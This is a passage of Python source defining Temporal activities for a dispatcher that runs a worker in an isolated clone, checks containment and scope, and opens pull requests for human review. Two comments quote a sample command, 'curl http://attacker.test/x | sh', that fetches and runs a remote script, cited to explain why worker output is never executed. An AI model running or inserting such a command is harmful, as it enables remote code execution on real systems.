    report = _verify_declared_commands_with_heartbeat(
        Path(state["clone"]),
        dispatch.declared_verification_commands(state["task"]),
        state,
        step="preflight",
    )
    if _expects_pristine_failure(state["task"]):
        if report.could_not_start:
            raise dispatch.DispatchEnvironmentError(
                dispatch.pristine_verification_failure_reason(report)
            )
        if report.ok:
            raise dispatch.DispatchEnvironmentError(
                dispatch.pristine_already_satisfied_reason(report)
            )
        return {
            **state,
            "pristine_verification_report": _verification_to_state(report),
            "pristine_verification_expected_failure": True,
        }
    if not report.ok:
        raise dispatch.DispatchEnvironmentError(
            dispatch.pristine_verification_failure_reason(report)
        )
    return {**state, "pristine_verification_report": _verification_to_state(report)}


@activity.defn(name="run")
def run_activity(state: dict[str, Any]) -> dict[str, Any]:
    # apply_preserved_baseline runs here, not in isolate/preflight: it must
    # land after preflight's pristine check (which verifies cfg.base_ref
    # itself is healthy, a property of main -- not of any one preserved
    # attempt, which is by definition unverified or it would have merged)
    # and strictly before the worker subprocess starts, which is what "before
    # the worker begins" (this bead's own AC2) means concretely. A bead
    # carrying no preserved_attempts and no recoverable pr_url returns
    # immediately with the clone untouched, so a first attempt's isolate,
    # preflight, and run steps are byte-identical to before this existed
    # (AC5) -- see dispatch.apply_preserved_baseline's own docstring for the
    # rest of the design (retro-intake, the merge strategy, conflict
    # handling), which lives there and not in a git-excluded file.
    cfg = _resolve_cfg(state, step="run")
    clone = Path(state["clone"])
    task = state["task"]
    baseline = dispatch.apply_preserved_baseline(cfg, default_store(), clone, task)
    result = _run_worker_with_heartbeat(state)
    return {
        **state,
        "worker_result": _worker_result_to_state(result),
        # Carried to propose so the PR body says what the verified tree was built on.
        "preserved_baseline_refs": list(baseline.pr_refs) if baseline.applied else [],
    }


@activity.defn(name="contain")
def contain_activity(state: dict[str, Any]) -> dict[str, Any]:
    cfg = _resolve_cfg(state, step="contain")
    clone = Path(state["clone"])
    result = _worker_result_from_state(state["worker_result"])
    budget = int(state["budget"])

    dispatch.raise_for_worker_failure(result, budget, clone)

    paths = dispatch.changed_paths(clone)
    if not paths:
        raise dispatch.DispatchError(
            dispatch.changed_nothing_failure_reason(
                result,
                preserved_baseline_applied=bool(state.get("preserved_baseline_refs")),
            )
        )

    before = _tree_from_state(state["before"])
    after = dispatch.fingerprint_tree(cfg.repo_root)
    breached = guards.containment_breach(paths, before.status, after.status)
    if breached:
        raise dispatch.DispatchError(
            "CONTAINMENT BREACH: the worker edited these files in its clone AND "
            f"their real counterparts changed during the run: {', '.join(breached)}. "
            "The diff is discarded unreviewed."
        )

    drift = guards.tree_delta(before.status, after.status)
    containment_note = ""
    if drift or before.head != after.head:
        containment_note = (
            "repo changed during the run, outside anything the worker touched: "
            f"{', '.join(drift) or 'none'}"
        )
        if before.head != after.head:
            containment_note += f"; HEAD moved {before.head[:8]}->{after.head[:8]}"

    return {**state, "paths": paths, "containment_note": containment_note}


#: Where scope_activity lands ``cfg.base_ref``'s current tip, fetched fresh
#: from ``cfg.remote`` inside the clone, before computing the merge-base to
#: diff from. Named distinctly from ``dispatch.TRUNK_CHECK_REF`` -- that one
#: is fetched into ``cfg.repo_root`` for a different check
#: (``dispatch.merge_commit_is_ancestor_of_main``, at reconcile) -- so the two
#: fetches, landing in different repos anyway, can never be confused for one
#: check standing in for the other.
_SCOPE_TRUNK_REF = "refs/factory/scope-trunk-check"


def _merge_base_diff_paths(clone: Path, remote: str, base_ref: str) -> list[str]:
    """Every path the PR will actually present: the diff between the clone's
    current state and its TRUE merge-base with ``base_ref`` as it stands on
    ``remote`` right now.

    ``remote`` and ``base_ref`` are explicit data -- ``cfg.remote`` and
    ``cfg.base_ref`` -- never an ambient ref such as ``main``, ``origin/main``
    or ``HEAD^`` resolved from whatever repository happens to be checked out
    (AC-4: the factory's task clones do not have the ref layout a developer
    checkout does -- ``dispatch.advance`` detaches HEAD and force-writes a
    local branch, and CI runs on a detached HEAD with no local trunk branch).

    Fetching is what makes this trustworthy where a plain local merge-base
    would not be: the clone's own initial HEAD is not itself proof of where
    trunk really is, because that HEAD can already sit on contamination an
    operator checkout picked up before this dispatch attempt ever cloned it
    (measured on PR #887, bead 766f103e -- the operator repo's ``main`` was
    being force-moved onto revisions carrying other pull requests' unmerged
    commits, so the clone's initial HEAD was already several commits off real
    trunk, and every path in between was structurally invisible to a diff
    computed from that HEAD while GitHub attributed all of it to the PR
    anyway). Fetching ``base_ref`` fresh from ``remote`` -- the real GitHub
    trunk, not anything already sitting in the clone or in the operator's
    local checkout -- and diffing from the merge-base against THAT catches
    contamination no matter how far below the clone's own history it sits.
    """
    dispatch.git_in_clone(
        clone,
        [
            "fetch",
            "--quiet",
            "--no-write-fetch-head",
            remote,
            f"+refs/heads/{base_ref}:{_SCOPE_TRUNK_REF}",
        ],
        timeout=300,
    )
    merge_base = dispatch.git_in_clone(
        clone, ["merge-base", "HEAD", _SCOPE_TRUNK_REF]
    ).stdout.strip()
    return dispatch.diff_paths_since(clone, merge_base)


@activity.defn(name="scope")
def scope_activity(state: dict[str, Any]) -> dict[str, Any]:
    """Grade the FULL diff the PR will present against its true merge-base
    with the trunk it will target -- not the diff since the clone's own HEAD
    at clone time, and not just the worker's own turn.

    ``state["paths"]`` (``contain_activity``'s ``changed_paths``) only sees
    what changed since HEAD, which misses two distinct things: a preserved
    attempt's diff ``apply_preserved_baseline`` already committed onto HEAD
    before the worker ran (measured on PR #828), and -- the case a plain
    ``verified_revision`` recompute cannot reach -- any commit the clone's
    own HEAD already carried at clone time, because a contaminated operator
    checkout put it there before this attempt ever started (measured on PR
    #887, bead 766f103e; see ``_merge_base_diff_paths``'s own docstring for
    the mechanism). ``verified_revision`` narrows the first case but not the
    second, since ``verified_revision`` IS the clone's HEAD at clone time --
    diffing against it is a diff since the clone's own history, not since the
    real merge-base. ``_merge_base_diff_paths`` fetches ``cfg.base_ref``
    fresh from ``cfg.remote`` and diffs from the true merge-base instead, so
    both cases are covered by construction, regardless of which revision the
    clone happened to be born on.
    """
    content = state["task"].get("content") or {}
    scope = content.get("scope") or {}
    cfg = _resolve_cfg(state, step="scope")
    worker_paths = list(state["paths"])
    baseline_refs = tuple(state.get("preserved_baseline_refs") or ())

    full_paths = _merge_base_diff_paths(Path(state["clone"]), cfg.remote, cfg.base_ref)

    verdict = guards.check_scope(full_paths, scope)
    if not verdict.ok:
        message = verdict.describe()
        inherited = sorted(set(full_paths) - set(worker_paths))
        if inherited and baseline_refs:
            message += (
                "; inherited from preserved baseline "
                f"{', '.join(baseline_refs)} (not the worker's own diff): "
                f"{', '.join(inherited)}"
            )
        raise dispatch.DispatchError(f"scope violation - {message}")
    return {**state, "scope_verdict": _scope_to_state(verdict)}


@activity.defn(name="smoke")
def smoke_activity(state: dict[str, Any]) -> dict[str, Any]:
    smoke = dispatch.smoke_check_python(Path(state["clone"]), list(state["paths"]))
    if smoke:
        raise dispatch.DispatchError(f"changed Python does not compile: {smoke}")
    return state


@activity.defn(name="verify")
def verify_activity(state: dict[str, Any]) -> dict[str, Any]:
    clone = Path(state["clone"])
    commands = dispatch.effective_verification_commands(
        state["task"], clone, state["paths"]
    )
    report = _verify_declared_commands_with_heartbeat(
        clone,
        commands,
        state,
        step="verify",
    )
    if not report.ok:
        raise dispatch.DispatchError(
            "declared verification did not pass:\n"
            + report.describe(output_limit=1000)
        )
    return {**state, "verification_report": _verification_to_state(report)}


def _open_pull_request_with_heartbeat(
    cfg: dispatch.Config,
    clone: Path,
    task: dict[str, Any],
    branch: str,
    stdout: str,
    scope_verdict: guards.ScopeVerdict,
    verification_report: dispatch.VerificationReport,
    state: dict[str, Any],
    *,
    citation_ids: tuple[str, ...] = (),
    verified_revision: str | None = None,
    preserved_baseline_refs: tuple[str, ...] = (),
    open_pull_request: Callable[..., str] | None = None,
    heartbeat: Heartbeat = _default_heartbeat,
    heartbeat_interval: float = DISPATCH_HEARTBEAT_INTERVAL.total_seconds(),
) -> str:
    """git push (up to 300s) + gh pr create (up to 180s); heartbeat through both.

    ``open_pull_request`` resolves ``dispatch.open_pull_request`` at call
    time, not as a bound default, so a test's ``monkeypatch.setattr(dispatch,
    "open_pull_request", ...)`` still reaches it.
    """
    call = open_pull_request or dispatch.open_pull_request
    return _run_blocking_with_heartbeat(
        lambda: call(
            cfg,
            clone,
            task,
            branch,
            stdout,
            scope_verdict,
            verification_report,
            citation_ids,
            verified_revision=verified_revision,
            preserved_baseline_refs=preserved_baseline_refs,
        ),
        heartbeat=heartbeat,
        heartbeat_interval=heartbeat_interval,
        details=_activity_heartbeat_details("propose", state),
    )


@activity.defn(name="propose")
def propose_activity(state: dict[str, Any]) -> dict[str, Any]:
    cfg = _resolve_cfg(state, step="propose")
    sub = default_store()
    task = state["task"]
    content = task.get("content") or {}
    worker_result = _worker_result_from_state(state["worker_result"])
    scope_verdict = _scope_from_state(state["scope_verdict"])
    verification_report = _verification_from_state(state["verification_report"])
    citation_ids = tuple(state.get("citation_ids") or ())
    branch = (
        f"factory/{content.get('lane', 'task')}-"
        f"{guards.slugify(content.get('title', ''))}-{task['id'][:8]}"
    )

    url = _open_pull_request_with_heartbeat(
        cfg,
        Path(state["clone"]),
        task,
        branch,
        worker_result.stdout,
        scope_verdict,
        verification_report,
        state,
        citation_ids=citation_ids,
        verified_revision=state.get("verified_revision"),
        preserved_baseline_refs=tuple(state.get("preserved_baseline_refs") or ()),
    )

    # One content write, not two — and ran_by rides along exactly as on the
    # CLI side (dispatch.py's propose): the fact of which orchestrator ran
    # this task, recorded live by the process that ran it (R2603-2). The
    # release gate's DO-NOT-MERGE on #636 caught this path missing the stamp
    # — the two-propose residue the R2602-11 parity guard cannot see, filed
    # as its own residual bead.
    ran_by = dispatch.resolve_ran_by(dispatch.declared_orchestrator())
    finished = dict(content)
    finished["pr_url"] = url
    finished["ran_by"] = ran_by.value
    sub.patch_content(task["id"], finished, dispatch.CREATED_BY)
    if ran_by.warning:
        sub.add_note(
            task["id"],
            "status",
            f"Unrecognized orchestrator writer: {ran_by.warning}.",
            dispatch.CREATED_BY,
            provenance=dispatch.provenance_for_operator_action(
                task["id"], "ran-by-unrecognized"
            ),
        )

    sub.add_note(
        task["id"],
        "attachment",
        f"Pull request opened for review: {url}",
        dispatch.CREATED_BY,
        provenance=dispatch.provenance_for_task(
            task["id"], state["worker"]["name"], worker_result.duration_s,
            tokens=worker_result.tokens, cost_usd=worker_result.cost_usd,
        ),
        url=url,
    )
    sub.add_note(
        task["id"],
        "status",
        f"{queue_order.WORKER_FINISHED_NOTE_PREFIX} {worker_result.duration_s:.0f}s, "
        f"{len(state['paths'])} file(s) changed, containment held, "
        f"{scope_verdict.describe()}. Declared verification: "
        f"{verification_report.describe(output_limit=500)}. Awaiting human review - "
        "the dispatcher never merges."
        + (
            f" Note: {state['containment_note']}."
            if state.get("containment_note")
            else ""
        ),
        dispatch.CREATED_BY,
        provenance=dispatch.provenance_for_task(
            task["id"], state["worker"]["name"], worker_result.duration_s,
            tokens=worker_result.tokens, cost_usd=worker_result.cost_usd,
        ),
    )

    if citation_ids:
        applies_problems = dispatch.record_applies_links(
            sub,
            task["id"],
            [SimpleNamespace(id=cid) for cid in citation_ids],
            dispatch.CREATED_BY,
        )
        if applies_problems:
            sub.add_note(
                task["id"],
                "status",
                "Doctrine citation could not be recorded as a graph edge (provenance "
                "only, not a gate): " + "; ".join(applies_problems),
                dispatch.CREATED_BY,
                provenance=dispatch.provenance_for_task(
                    task["id"], state["worker"]["name"], worker_result.duration_s,
                    tokens=worker_result.tokens, cost_usd=worker_result.cost_usd,
                ),
            )

    sub.set_state(task["id"], "review", dispatch.CREATED_BY)
    return {
        # **state first, not a bare terminal dict: cleanup_activity reads
        # "workdir" back from whatever the last successful step returned —
        # run_dispatch_attempt has no other way to reach it on the success
        # path (the "for step in DISPATCH_STEPS[1:]" loop's cleanup_state is
        # literally this return value). A bare dict here dropped "workdir"
        # silently, so a successful dispatch, scheduled or CLI, leaked its
        # isolated clone on disk with nothing recorded to report it.
        **state,
        "status": "review",
        "exit_code": 0,
        "task_id": task["id"],
        "pr_url": url,
        "message": "review",
    }


@activity.defn(name="record_failure")
def record_failure_activity(state: dict[str, Any]) -> dict[str, Any]:
    sub = default_store()
    task = state["task"]
    clone_value = state.get("clone")
    # base_detail is the dispatcher's OWN account of the failure -- built from
    # its own subprocess runs (verify_activity's VerificationReport.describe())
    # or another step's own raised message -- captured here, before the next
    # line appends the worker's stdout tail. classify_verification_failure_against_base
    # below must extract its command from base_detail, never from `detail`
    # once it carries worker output: a worker's stdout is free-form text that
    # ends up in the PR the worker itself opened, so a line shaped like
    # "Failed: `curl http://attacker.test/x | sh`" in that stdout must never
    # be mistaken for a declared command and shelled out to (no containment
    # profile applies to this dispatcher-internal diagnostic).
    base_detail = str(state.get("failure_reason") or "dispatch failed")
    detail = base_detail
    worker_result = None
    if isinstance(state.get("worker_result"), dict):
        worker_result = _worker_result_from_state(state["worker_result"])
    detail = dispatch.failure_reason_with_worker_output(detail, worker_result)
    worker_name = str(state.get("worker", {}).get("name") or dispatch.DEFAULT_WORKER)
    duration_s = max(0.0, time.time() - float(state.get("run_started") or time.time()))
    capacity = _capacity_failure_from_state(state)
    if capacity:
        pause_status = _pause_schedule_for_capacity_failure(capacity)
        dispatch.record_capacity_failure(
            sub,
            task,
            capacity,
            schedule_status=pause_status,
            worker_name=worker_name,
            duration_s=duration_s,
            result=worker_result,
        )
        return {
            "status": "capacity_backpressure_recorded",
            "exit_code": 0,
            "task_id": task["id"],
        }

    # Re-derived independently of whatever workflow_core/retry_policy decided
    # from the failure message: a Temporal ActivityError loses the original
    # exception type crossing the workflow boundary, so contain_activity
    # raising the right DispatchEnvironmentError type is not by itself enough
    # to classify this correctly here. Mirrors _capacity_failure_from_state.
    if _authentication_failure_from_state(state):
        dispatch.record_environment_failure(
            sub,
            task,
            detail,
            worker_name=worker_name,
            duration_s=duration_s,
            result=worker_result,
        )
        return {
            "status": "environmental_fault_recorded",
            "exit_code": 0,
            "task_id": task["id"],
        }

    if "worker_result" not in state:
        if dispatch.is_stale_base_ref_reason(detail):
            dispatch.record_stale_base_ref_fault(
                sub,
                task,
                detail,
                worker_name=worker_name,
                duration_s=duration_s,
            )
            return {
                "status": "stale_base_ref_recorded",
                "exit_code": 0,
                "task_id": task["id"],
            }
        if dispatch.PRISTINE_ALREADY_SATISFIED_MARKER in detail:
            # The single implementation for both the CLI and the scheduled
            # drain now (this used to be a dispatch_steps-local duplicate
            # with its own, different wording for the identical event).
            dispatch.record_pristine_already_satisfied(
                sub,
                task,
                detail,
                worker_name=worker_name,
                duration_s=duration_s,
            )
            return {
                "status": "already_satisfied_recorded",
                "exit_code": 0,
                "task_id": task["id"],
            }
        dispatch.record_environment_failure(
            sub,
            task,
            detail,
            worker_name=worker_name,
            duration_s=duration_s,
            result=worker_result,
        )
        return {
            "status": "environmental_fault_recorded",
            "exit_code": 0,
            "task_id": task["id"],
        }

    if str(state.get("failure_class") or "") == retry_policy.ALREADY_SATISFIED_FAILURE.name:
        dispatch.record_already_satisfied_work(
            sub,
            task,
            detail,
            worker_name=worker_name,
            duration_s=duration_s,
            result=worker_result,
        )
        return {
            "status": "already_satisfied_recorded",
            "exit_code": 0,
            "task_id": task["id"],
        }

    patch_path: str | None = None
    if clone_value:
        try:
            patch = dispatch.save_failure_patch(Path(clone_value), task["id"])
        except dispatch.CloneGitControlTampered as exc:
            detail = (
                f"{detail} Worker diff NOT preserved: git skipped because the "
                f"clone's git control paths changed during the run ({exc})."
            )
        else:
            if patch:
                detail = f"{detail} Worker diff preserved at {patch}."
                patch_path = str(patch)

    base_check = _base_verification_check_for_failure(state, base_detail)
    if base_check is not None:
        # Prepended, not appended: by this point `detail` already carries
        # describe()'s own "Could not start:"/"Output:" sections (inside
        # base_detail) and the worker's stdout tail
        # (failure_reason_with_worker_output, above) -- all worker-shapeable.
        # find_prior_base_verification_check (dispatch.py) anchors its parse
        # at position 0 of the note, and this is the only call that writes a
        # legitimate memo -- prepending here is what makes position 0
        # correspond only to a real memo on a later attempt's read, never to
        # text a worker controls.
        detail = f"{base_check.detail} {detail}"

    dispatch.fail_task(
        sub,
        task,
        detail,
        worker_name=worker_name,
        duration_s=duration_s,
        result=worker_result,
        patch_path=patch_path,
    )
    return {"status": "failure_recorded", "exit_code": 0, "task_id": task["id"]}


def _base_verification_check_for_failure(
    state: dict[str, Any], base_detail: str
) -> dispatch.BaseVerificationCheck | None:
    """Measure a declared-verification failure against the unpatched base.

    dev.finding 91dedb1a: a worker's own "pre-existing on main" claim was
    recorded verbatim and unmeasured, so a bead re-dispatched into the same
    wall with a full budget each time. None when there is nothing to compare
    -- no clone left to check out from, no recorded base revision
    (``isolate_activity``'s ``verified_revision``), or ``base_detail`` names
    no failed declared command (a scope violation, changed-nothing, or any
    other work-failure shape this diagnostic has no business touching).
    Never raises: this must never turn a work failure into an environment
    failure or spend/save a retry attempt (PRIN-015) -- see
    ``dispatch.classify_verification_failure_against_base``'s own docstring
    for the fail-soft contract this additionally guards at the call site.

    ``base_detail`` MUST be the dispatcher's own failure account -- built
    from its own subprocess runs, before ``failure_reason_with_worker_output``
    appends the worker's stdout tail -- never the worker-output-bearing
    ``detail`` the caller also builds. The worker's stdout is free-form text
    that lands verbatim in the PR the worker itself opens; a line shaped like
    the "Failed: `cmd`" pattern this function parses, planted there, would
    otherwise select an attacker-chosen command for
    ``classify_verification_failure_against_base`` to shell out to with no
    containment profile.

    ``state["notes"]`` -- the notes ``claim_activity`` fetched before this
    attempt's own worker ran, carried through every step's returned state --
    is passed through as ``prior_notes`` so an already-classified
    ``(command, base_revision)`` pair is answered from that recorded verdict
    instead of re-running the declared command against the base revision on
    every retry (F2). Absent (``None``) when this state was built without it
    (e.g. an older workflow shape); ``classify_verification_failure_against_base``
    treats that exactly like today's no-memo-lookup behavior.
    """
    clone_value = state.get("clone")
    base_revision = state.get("verified_revision")
    if not clone_value or not base_revision:
        return None
    command = dispatch.first_failed_verification_command(base_detail)
    if not command:
        return None
    try:
        return dispatch.classify_verification_failure_against_base(
            Path(clone_value),
            command,
            str(base_revision),
            prior_notes=state.get("notes"),
        )
    except Exception:  # noqa: BLE001 - this diagnostic must never mask the real failure
        return None


def _capacity_failure_from_state(state: dict[str, Any]) -> dispatch.CapacityFailure | None:
    worker_result = state.get("worker_result")
    if isinstance(worker_result, dict):
        result = _worker_result_from_state(worker_result)
        detected = dispatch.detect_worker_capacity_failure(result)
        if detected:
            return detected
    return None


def _authentication_failure_from_state(state: dict[str, Any]) -> bool:
    """Whether this failure is a #452/#465 authentication failure.

    Re-detected directly from the worker result and clone rather than trusted
    from the message text a step raised, since that text does not carry its
    exception type across the Temporal workflow boundary.
    """
    worker_result = state.get("worker_result")
    clone_value = state.get("clone")
    if not isinstance(worker_result, dict) or not clone_value:
        return False
    result = _worker_result_from_state(worker_result)
    if not dispatch.detect_worker_authentication_failure(result):
        return False
    try:
        changed = dispatch.changed_paths(Path(clone_value))
    except dispatch.CloneGitControlTampered:
        # The run failed for containment, not authentication (dev.finding
        # 79db3113 part c2, AC-3) -- record_failure_activity's other paths
        # record the containment failure on its own terms.
        return False
    return not changed


def _pause_schedule_for_capacity_failure(failure: dispatch.CapacityFailure) -> str:
    note = schedule_runtime.capacity_pause_note(failure.describe())
    try:
        asyncio.run(pause_dispatch_schedule_for_capacity_failure(note))
    except Exception as exc:  # noqa: BLE001 - record failed pause attempt on the bead
        return (
            "Temporal schedule pause failed; unattended dispatch may keep firing. "
            f"schedule_id={config.DISPATCH_SCHEDULE_ID}; reason={exc}"
        )
    return (
        "Temporal schedule paused for capacity backpressure. "
        f"schedule_id={config.DISPATCH_SCHEDULE_ID}; pause_note={note}"
    )


async def pause_dispatch_schedule_for_capacity_failure(note: str) -> None:
    client = await Client.connect(
        config.TEMPORAL_URL,
        namespace=config.TEMPORAL_NAMESPACE,
    )
    await schedule_runtime.pause_dispatch_schedule(
        client,
        TEMPORAL_PAUSE_TYPES,
        schedule_id=config.DISPATCH_SCHEDULE_ID,
        note=note,
    )


@activity.defn(name="reconcile")
def reconcile_activity(request: dict[str, Any]) -> dict[str, Any]:
    """Settle review tasks whose PR already reached trunk.

    ``reconcile_review_tasks`` has always been correct and has only ever been
    reachable by a human typing ``--reconcile-review``. Nothing scheduled it, so
    a task whose PR merged stayed in review until someone noticed.
    """
    cfg = dispatch.Config.from_env()
    sub = default_store()
    exit_code = dispatch.reconcile_review_tasks(
        cfg,
        sub,
        dry_run=bool(request.get("dry_run")),
        actor=dispatch.SCHEDULED_ACTOR,
    )
    return {"status": "reconciled", "exit_code": exit_code}


@activity.defn(name="cleanup")
def cleanup_activity(state: dict[str, Any]) -> dict[str, Any]:
    # cleanup_activity is the only step workflow_core.run_dispatch_attempt
    # guarantees runs after a successful claim (its `finally`), so it is the
    # release point for the dispatch run lock claim_activity took -- in its
    # own finally, so a failed rmtree below can never leave the lock held.
    try:
        workdir = state.get("workdir")
        if workdir:
            # Not ignore_errors=True: dispatch.cleanup_workdir reports a failed
            # rmtree (e.g. a full disk) with a WARNING instead of discarding it,
            # the same loud-cleanup behavior the CLI path already has.
            dispatch.cleanup_workdir(Path(workdir))
        return {"status": "cleaned", "exit_code": 0}
    finally:
        _release_dispatch_run_lock()


ACTIVITIES = [
    claim_activity,
    isolate_activity,
    preflight_activity,
    run_activity,
    contain_activity,
    scope_activity,
    smoke_activity,
    verify_activity,
    propose_activity,
    record_failure_activity,
    reconcile_activity,
    cleanup_activity,
]

# name -> step function, derived from ACTIVITIES rather than hand-listed a
# second time. Every entry here is named "{step}_activity" and separately
# registered with Temporal under the matching @activity.defn(name="{step}")
# (via worker.py's Worker(activities=...), which is built from this exact
# list through activities/__init__.py) — this dict is the same table by
# construction, resolvable in-process by a caller (dispatch.dispatch_once)
# that drives these functions directly, with no Temporal worker in the loop
# to look @activity.defn's registered name up through.
ACTIVITY_FUNCTIONS: dict[str, Callable[[dict[str, Any]], dict[str, Any]]] = {
    fn.__name__.removesuffix("_activity"): fn for fn in ACTIVITIES
}
